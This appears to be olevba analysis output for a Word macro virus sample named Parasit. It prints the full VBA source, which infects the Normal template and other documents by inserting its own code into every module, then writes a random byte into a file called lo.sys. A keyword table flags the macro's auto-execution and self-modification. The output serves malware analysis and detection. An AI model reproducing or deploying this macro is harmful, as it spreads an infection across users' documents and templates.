olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Parasit-963ae95b89ae64755150a64e2fa94173bea88d31
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Parasit-963ae95b89ae64755150a64e2fa94173bea88d31 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
GoSub Flesh:
'RNO
Flesh:
If Hook = 1 Then Exit Sub
Owner = ThisDocument.Name
If UCase(Owner) = "NORMAL.DOT" Then Ways = 1 Else Ways = 0
Select Case Ways
Case 0
    
    Set Carrier = ActiveDocument.VBProject.VBE.ActiveCodePane.CodeModule
    For i = 1 To Carrier.CountOfLines
        If Carrier.Lines(i, 1) = "Flesh:" Then
            For x = i To Carrier.CountOfLines - 1
                VC = VC & Carrier.Lines(x, 1) & Chr(13)
            Next x
            VC = Left(VC, Len(VC) - 1)
        i = x
        End If
    Next i
    
    For i = 1 To NormalTemplate.VBProject.VBComponents.Count
        Set ToOwn = NormalTemplate.VBProject.VBComponents(i).CodeModule
        If ToOwn.CountOfLines <= 1 Then ToOwn.InsertLines 1, "Sub AutoOpen()" & Chr(13) & "'" & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(13) & "End Sub"
        If ToOwn.Lines(2, 1) = "GoSub Flesh:" Then GoTo FAllDoneP
        For x = 1 To ToOwn.CountOfLines + 1
            If Left(ToOwn.Lines(x, 1), 3) = "Sub" Or Left(ToOwn.Lines(x, 1), 10) = "Private Sub" Then ToOwn.InsertLines x + 1, "Gosub Flesh:"
            If Left(ToOwn.Lines(x, 1), 7) = "End Sub" Then ToOwn.InsertLines x, VC
        Next x
FAllDoneP:
    Next i
GoTo DeadFlesh
Case 1
    
    Set Carrier = NormalTemplate.VBProject.VBE.ActiveCodePane.CodeModule
    For i = 1 To Carrier.CountOfLines
        If Carrier.Lines(i, 1) = "Flesh:" Then
            For x = i To Carrier.CountOfLines - 1
                VC = VC & Carrier.Lines(x, 1) & Chr(13)
            Next x
            VC = Left(VC, Len(VC) - 1)
        i = x
        End If
    Next i
    
    For i = 1 To ActiveDocument.VBProject.VBComponents.Count
        Set ToOwn = ActiveDocument.VBProject.VBComponents(i).CodeModule
        If ToOwn.CountOfLines <= 1 Then ToOwn.InsertLines 1, "Sub AutoOpen()" & Chr(13) & "'" & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(13) & "End Sub"
        If ToOwn.Lines(2, 1) = "GoSub Flesh:" Then GoTo PAllDoneF
        For x = 1 To ToOwn.CountOfLines + 1
            If Left(ToOwn.Lines(x, 1), 3) = "Sub" Or Left(ToOwn.Lines(x, 1), 10) = "Private Sub" Then ToOwn.InsertLines x + 1, "Gosub Flesh:"
            If Left(ToOwn.Lines(x, 1), 7) = "End Sub" Then ToOwn.InsertLines x, VC
        Next x
PAllDoneF:
    Next i
End Select
DeadFlesh:
EatUp = Int(Rnd * 50000000) + 10000000
Theef = Int(Rnd * 255)
Open "lo.sys" For Binary As #1
Put #1, EatUp, Theef
Close #1
Hook = 1
Return
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Put                 |May write to a file (if combined with Open)  |
|Suspicious|Binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |VBProject.VBE       |Executable file name                         |
+----------+--------------------+---------------------------------------------+

